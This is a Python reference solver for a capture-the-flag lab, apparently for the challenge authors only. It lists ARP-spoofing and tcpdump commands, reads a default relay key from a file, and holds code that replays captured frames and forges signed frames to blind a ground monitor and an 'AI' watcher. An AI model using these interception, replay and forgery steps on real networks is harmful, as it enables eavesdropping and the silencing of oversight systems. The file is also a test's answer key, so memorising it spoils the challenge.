#!/usr/bin/env python3
"""
Reference solver — DELIVERY-SIDE ONLY, never shipped to players.

This documents the intended full solution against the LIVE docker stack, run
from the `linkmaint` foothold. The ARP interception itself uses standard Kali
tooling (arpspoof/scapy); this script shows the frame-level logic once you are
positioned in the middle of the segment.

Intended manual flow on linkmaint:

  1. RECON
       cat .relay_notes ; ./linkstat
       -> ground link is unauthenticated; two watchers; AI needs the relay key.
       cat relay.d/relay.key            # RELAY-FACTORY-DEFAULT

  2. GET IN THE MIDDLE  (standard tooling — this is the real ARP step)
       # poison so beacon_relay <-> landfall_link flows through you
       arpspoof -i eth0 -t <beacon_ip>   <landfall_ip> &
       arpspoof -i eth0 -t <landfall_ip> <beacon_ip>   &

  3. EASY FLAG — capture the transmission
       tcpdump -i eth0 -A 'tcp port 9101'
       -> read a TM|... frame; the TOK:CTF{...} field is the capture flag.

  4. MID FLAG — go dark
       a) ground: resend a captured frame to landfall_link (it has no freshness
          check, so a duplicate seq is accepted -> ground blinded).
       b) AI: sign a FRESH frame with the default relay key and send it to
          sentry_watcher (valid MAC + higher seq -> accepted -> AI blinded).
       ./linkstat   # both blinded -> STATION DARK + go-dark flag

Below: the frame-level primitives used in steps 4a/4b, for reference/testing.
"""
from __future__ import annotations

import os
import socket
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "common"))
import frame as F  # noqa: E402


def send(host, port, line):
    with socket.create_connection((host, port), timeout=2) as s:
        s.sendall((line + "\n").encode())


def replay_to_ground(host, port, captured_frame: str):
    """4a — resend a captured frame; landfall accepts the duplicate."""
    send(host, port, captured_frame)
    send(host, port, captured_frame)  # duplicate seq -> replay detected/accepted


def forge_to_ai(host, port, key: str, seq: int):
    """4b — craft a fresh, correctly-signed frame beacon never sent."""
    ts = "00:00:00Z"
    base = F.build(seq, ts, "NOMINAL", "ghost@nowhere", "TOK:none")
    signed = F.sign(base, key)
    send(host, port, signed)


if __name__ == "__main__":
    # Example against a locally-running stack (see tests/ for the harness).
    lf_host = os.getenv("LANDFALL_HOST", "127.0.0.1")
    lf_port = int(os.getenv("LANDFALL_PORT", "9101"))
    sw_host = os.getenv("SENTRY_HOST", "127.0.0.1")
    sw_port = int(os.getenv("SENTRY_PORT", "9102"))
    key = os.getenv("RELAY_KEY", "RELAY-FACTORY-DEFAULT")

    captured = F.build(1500, "20:41:07Z", "NOMINAL", "crew01@shell", "CTF{demo}")
    replay_to_ground(lf_host, lf_port, captured)
    forge_to_ai(sw_host, sw_port, key, seq=999999)
    print("replayed to ground + forged to AI; check linkstat / flag_gate STATUS.")
